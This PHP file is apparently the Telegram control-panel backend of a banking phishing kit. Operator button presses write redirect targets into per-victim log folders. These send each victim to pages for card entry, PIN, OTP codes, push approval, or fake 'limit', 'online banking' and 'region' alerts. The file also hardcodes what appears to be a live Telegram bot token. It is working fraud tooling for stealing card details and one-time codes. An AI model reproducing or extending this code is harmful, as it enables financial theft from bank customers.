
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('Europe/Kiev');
include_once('vendor/autoload.php');


use Telegram\Bot\FileUpload\InputFile; 
use Telegram\Bot\Api;


$telegram = new Api("1807290261:AAGyCGSTILlXG_-6jcn80bfQ1swHcx8R4JQ"); // раре
$result = $telegram->getWebhookUpdates();
                         
$text = $result["message"]["text"];
$chat_id = $result["message"]["chat"]["id"];
$username = $result["message"]["from"]["username"];
$first_name = $result["message"]["from"]["first_name"];
$last_name = $result["message"]["from"]["last_name"];
$name = $first_name . ' ' . $last_name;
$message_id_now =$result['message_id'];
$message_id = $result['message']['message_id'];
$user_id = $result['message']["from"]["id"];
$user_phone = $result["message"]["contact"]["phone_number"];
$callback_query = $result['callback_query']; //получаем колбэк данные для кнопок
$message = $callback_query["message"]["text"]; //текст смски, на которой нажали кнопку.
$who = $callback_query["from"]["id"]; //кто нажал на кнопку
$username_cb = $callback_query["from"]["username"]; // ник кто нажал на кнопку
$first_name_cb = $callback_query["from"]["first_name"];
$last_name_cb = $callback_query["from"]["last_name"];
$who_name = $first_name_cb .' '. $last_name_cb; // имя кто нажал на кнопку
$data = $callback_query['data']; // переменная для вызова функции на кнопке
$chat_id_cb = $callback_query['message']["chat"]["id"]; //chat id callback
$message_id_cb =  $callback_query['message']['message_id']; //получаем ид смски callback
$username_cb =  $callback_query['from']["username"]; //получаем ид смски callback
$cb_text = $callback_query['message']['text'];


$now_date = date( "Y-m-d" );
// ====================
//
//  Кнопка или текст?
//
// ====================

file_put_contents('log.txt',$result);




if (isset($text)){
  $chat = $chat_id;
  $user_name = $username;
}elseif (isset($data)){
  $chat = $chat_id_cb;
  $user_name = $username_cb;
}else{
  $chat = $chat_id;
  $user_name = $username;
}




if  (preg_match('/card_/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'card.php?type=decline&');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ Отправлен на ввод карты",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/pin_/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'pin.php?');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ Отправлен на pin",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/push/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'push.php?');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ Отправлен на push",'parse_mode' => 'markdown']);

}

elseif  (preg_match('/otp/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'code.php?');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ Отправлен на otp",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/limit/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'alert.php?type=limit&');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ LIMIT",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/acc/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'alert.php?type=acc&');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ Online banking",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/region/',$data)){
$url_id = explode('_',$data);
$id = $url_id[1];

file_put_contents("token/logs/$id/redirect.txt",'alert.php?type=region&');
$telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ REGION",'parse_mode' => 'markdown']);

}
elseif  (preg_match('/success/',$data)){
  $url_id = explode('_',$data);
  $id = $url_id[1];
  
  file_put_contents("token/logs/$id/redirect.txt",'success.php?type=region&');
  $telegram->editMessageText([ 'chat_id' => $chat,'message_id' =>  $message_id_cb,'text' => "*".$cb_text."*\n\n". "❗️ сэксэшел",'parse_mode' => 'markdown']);
  
  }